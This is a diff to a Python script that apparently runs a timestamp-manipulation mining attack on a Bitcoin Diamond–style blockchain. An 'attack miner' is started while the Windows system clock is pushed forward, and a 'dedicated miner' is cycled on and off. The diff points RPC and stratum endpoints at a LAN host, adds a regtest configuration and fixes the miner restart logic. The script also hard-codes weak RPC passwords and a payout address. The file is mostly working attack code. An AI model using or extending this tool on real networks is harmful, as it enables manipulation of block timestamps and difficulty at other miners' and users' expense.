@@ -41,15 +41,22 @@ from bitcoinrpc.authproxy import AuthServiceProxy
 mainnet = {
     'rpc_user': 'bitcoinrpc',
     'rpc_password': '123456',
-    'rpc_host': '127.0.0.1',
+    'rpc_host': '172.168.0.103',
     'rpc_port': 7116
 }
 
 testnet = {
     'rpc_user': 'bitcoinrpc',
     'rpc_password': '123456',
-    'rpc_host': '127.0.0.1',
+    'rpc_host': '172.168.0.103',
     'rpc_port': 17116
+}
+
+regtest = {
+    'rpc_user': 'user',
+    'rpc_password': 'pass',
+    'rpc_host': '172.168.0.103',
+    'rpc_port': 16101
 }
 
 bitcoin_rpc = None
@@ -57,7 +64,7 @@ attack_miner = None
 dedicated_miner = None
 attack_miner_log = 'attack_miner.log'
 dedicated_miner_log = 'dedicated_miner.log'
-stratum_server = '127.0.0.1:3333'
+stratum_server = '172.168.0.103:3333'
 
 interrupted = 0
 target_solve_time = 600
@@ -90,6 +97,8 @@ def set_net_type(network):
         net = mainnet
     elif network == 'testnet':
         net = testnet
+    elif network == 'regtest':
+        net = regtest
     else:
         return
     bitcoin_rpc = AuthServiceProxy("http://%s:%s@%s:%s"
@@ -110,7 +119,7 @@ def sigint_handler(sig, frame):
 
 def start_miner(thread_num, output):
     global stratum_server
-    print('start %s threads miner' % thread_num)
+    # print('start %s threads miner' % thread_num)
     return subprocess.Popen('ccminer -a bcd -o stratum+tcp://%s '
                             '-u 15DG8HmCHU2Lzc7VpEEhY15iRMCBcje5DY.1234 -p x -t %s' % (stratum_server, thread_num),
                             stdout=output,
@@ -144,7 +153,7 @@ def main():
 
     signal.signal(signal.SIGINT, sigint_handler)
 
-    set_net_type('testnet')
+    set_net_type('regtest')
 
     dedicated_miner_output = open(dedicated_miner_log, 'w')
     attack_miner_output = open(attack_miner_log, 'w')
@@ -152,14 +161,16 @@ def main():
     dedicated_miner_off_time = get_dedicated_miner_off_time()
 
     dedicated_miner = start_miner(dedicated_threads, dedicated_miner_output)
+    print('dedicated miner %s started' % dedicated_miner.pid)
+
     last_height = get_last_height()
 
     while True:
         sleep(1)
         if interrupted == 1:
             interrupted = 0
-            print('starting attack')
             attack_miner = start_miner(attacker_threads, attack_miner_output)
+            print('attack miner %s started' % attack_miner.pid)
 
             while interrupted == 0:
                 sleep(1)
@@ -171,17 +182,18 @@ def main():
                         set_windows_time(int(time.time()) + bad_timestamp_size)
             interrupted = 0
             stop_miner(attack_miner)
-            print('attack stopped')
+            print('attack miner %s stopped' % attack_miner.pid)
 
         height = get_last_height()
         if height != last_height:
             last_height = height
             print('dedicated miner found', height)
             stop_miner(dedicated_miner)
-            print('miner sleeping for %s seconds' % dedicated_miner_off_time)
+            print('dedicated miner %s stopped' % dedicated_miner.pid)
+            print('sleep for %s seconds' % dedicated_miner_off_time)
             sleep(dedicated_miner_off_time)
-            print('starting dedicated miner')
-            start_miner(dedicated_threads, dedicated_miner_output)
+            dedicated_miner = start_miner(dedicated_threads, dedicated_miner_output)
+            print('dedicated miner %s started' % dedicated_miner.pid)
 
 
 if __name__ == '__main__':
